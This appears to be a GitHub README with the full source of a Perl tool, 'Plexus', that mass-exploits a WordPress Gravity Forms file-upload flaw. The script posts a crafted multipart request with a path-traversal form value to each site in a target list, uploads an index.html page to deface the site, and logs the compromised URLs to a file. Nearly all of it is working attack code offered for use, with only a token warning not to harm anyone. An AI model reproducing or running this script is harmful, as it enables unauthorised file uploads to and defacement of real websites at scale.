# Plexus

Plexus is a upload of Index , in websites with 'WordPress' Failure

Powered by Gabriel Packy
  

![Alt text](https://i.ytimg.com/vi/l1nEbN2n3Xo/maxresdefault.jpg "Screenshot")

```
# Use
```
cd Plexus
perl Plexus.pl targets.txt
```
# Author 

Gabriel Packy.
Github :- github.com/gblpcky
 
# Donate and contact :3 

Email:  gblpacky7@hotmail.com

If you like my code :3 buy me a coffee or tea (i love tea)

# Be Carefuly

Do not use this script to harm someone.


 
# Code...

#!/usr/bin/perl -U

use Win32::Console::ANSI;
use Term::ANSIColor;
use HTTP::Request;
use LWP::UserAgent;
use IO::Select;
use HTTP::Response;
use LWP::UserAgent;
use Win32::Console::ANSI;
use Term::ANSIColor;
use utf8;
use LWP::UserAgent;
use Win32::Console::ANSI;
use Term::ANSIColor;
use utf8;

system(($^O eq 'MSWin32') ? 'cls' : 'clear');
system "cls";
print colored q{ 
.     .       .  .   . .   .   . .    +  .
  .     .  :     .    .. :. .___---------___.
       .  .   .    .  :.:. _".^ .^ ^.  '.. :"-_. .
    .  :       .  .  .:../:            . .^  :.:\.
        .   . :: +. :.:/: .   .    .        . . .:\
 .  :    .     . _ :::/:               .  ^ .  . .:\
  .. . .   . - : :.:./.                        .  .:\
  .      .     . :..|:                    .  .  ^. .:|
    .       . : : ..||        .                . . !:|
  .     . . . ::. ::\(                           . :)/
 .   .     : . : .:.|. ######              .#######::|
  :.. .  :-  : .:  ::|.#######           ..########:|
 .  .  .  ..  .  .. :\ ########          :######## :/
  .        .+ :: : -.:\ ########       . ########.:/
    .  .+   . . . . :.:\. #######       #######..:/
      :: . . . . ::.:..:.\           .   .   ..:/
   .   .   .  .. :  -::::.\.       | |     . .:/
      .  :  .  .  .-:.":.::.\             ..:/
 .      -.   . . . .: .:::.:.\.           .:/
.   .   .  :      : ....::_:..:\   ___.  :/
   .   .  .   .:. .. .  .: :.:.:\       :/
     +   .   .   : . ::. :.:. .:.|\  .:/|
     .         +   .  .  ...:: ..|  --.:|
.      . . .   .  .  . ... :..:.."(  ..)"
 .   .       .      :  .   .: ::/  .  .::\
},'bold';
print "\n\n";
print"         --=[";
print colored(" Plexus - WordPress Exploit ",'on_green');
print"]\n";
print"         --=[";
print colored(" Gabriel Packy ",'on_red');
print"]\n";

my $usage = " \nperl $0 <targets.txt>\n perl $0 targets.txt";
die "$usage" unless $ARGV[0];

open(tarrget,"<$ARGV[0]") or die "$!";
while(<tarrget>){
chomp($_);
$target = $_;
my $path = "/?gf_page=upload"; sleep(1);

print "\n  [TARGET] => $target\n\n";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $exploit = $ua->post("$target/$path", Cookie => "", Content_Type => "form-data", Content => [file => ["index.jpg"], field_id => "3", form_id => "1",gform_unique_id => "../../../", name => "index.html"]);

print "  [";
print colored ("Work",'bold on_blue'); sleep(1);
print "]","\n";

if ($exploit->decoded_content =~ /_input_3_index.html/) {
print "  [";
print colored ("WP_Vulnerable",'bold on_red'),; sleep(1);
print "]";
print " Upload Idex\n";	
print "  [";
print colored ("Okay",'bold on_green'),; sleep(1);
print "]";
print " Index Uploaded\n";
print "  [";
print colored ("Target in Index",'bold on_green'),; sleep(1);
print "]";
print " $target/wp-content/uploads/_input_3_index.html\n";	
	open(save, '>>save.txt');
	
    print save "$target/wp-content/uploads/_input_3_index.html\n";
	
    close(save);
}

else { 
print "  [";
print colored ("Error 571",'bold on_red'),; sleep(1);
print "]";
print " Oops.. Your Target is Not Vulnerable\n";
sleep(1);}

}
